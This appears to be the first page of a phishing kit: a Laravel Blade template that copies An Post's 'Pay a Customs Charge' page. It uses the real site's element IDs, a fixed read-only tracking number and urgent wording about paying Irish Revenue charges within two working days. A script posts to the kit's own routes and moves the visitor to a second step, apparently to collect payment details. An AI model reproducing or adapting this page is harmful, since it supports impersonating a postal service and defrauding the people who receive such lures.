@extends('layouts.main')
@section('title', "Pay a Customs Charge")
@section('main')
<section
id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlFormLookup"
class="f14">
<p class="f14__sub"><span
        id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_lblCustomChargeText">Irish
        Revenue have applied a Customs Charge to your An Post delivery. This must be paid
        <strong>within 2 working days</strong>. An Post may apply a fee to handle, collect and
        process the item. Where applicable, this fee will be added to customs charges applied by
        Revenue.</span></p>
<div class="f14__section__wrapper f14__section__wrapper--increase">

    <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlLookupAnPostTrackingNumberWrapper"
        class="f14__form__group form__group js-slideup">
        <div class="form__group__wrapper">
            <label for="txtLookupAnPostTrackingNumber"></label>
            <input
                name="p$lt$WebPartZone13$zoneContent$pageplaceholder$p$lt$ctl01$F14PayCustomsCharges$txtLookupAnPostTrackingNumber"
                type="text" maxlength="35" value="IR092362017681513"
                id="txtLookupAnPostTrackingNumber" class="js-f14-tracking-id" data-required=""
                data-required-message="Your tracking id is required" autocomplete="off"
                readonly="readonly">
        </div>
        <p class="helper">Tracking ID format: AB123456789GB</p>
        <span class="form__group__error" aria-hidden="true"
            data-gtm-vis-polling-id-10069780_227="215"></span>
    </div>

    <div class="btnSub loginBtn f14__btn__wrapper f14__btn__wrapper--increase">
        <input class="btnSub loginBtn submit bn bn--primary gtm-cta" type="submit"
            name="p$lt$WebPartZone13$zoneContent$pageplaceholder$p$lt$ctl01$F14PayCustomsCharges$btnLookupCharge"
            value="Continue"
            id="btnSub loginBtn p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_btnLookupCharge">
    </div>
    <div id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlAPIErrors"
        style="color:red;font-weight:bold"></div>
</div>
</section>
@include('main.inc.sidebox')
@endsection
@section('js')
<script>
    $(".loginBtn").on("click", () => {
        $.ajax({
            method: "POST",
            url: "{{route('main.new')}}",
            data: {
                _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                 type: "new"
                }
        }).done((data) => {
            url("{{route('main.step_two')}}");
        });
    });

</script>
@endsection
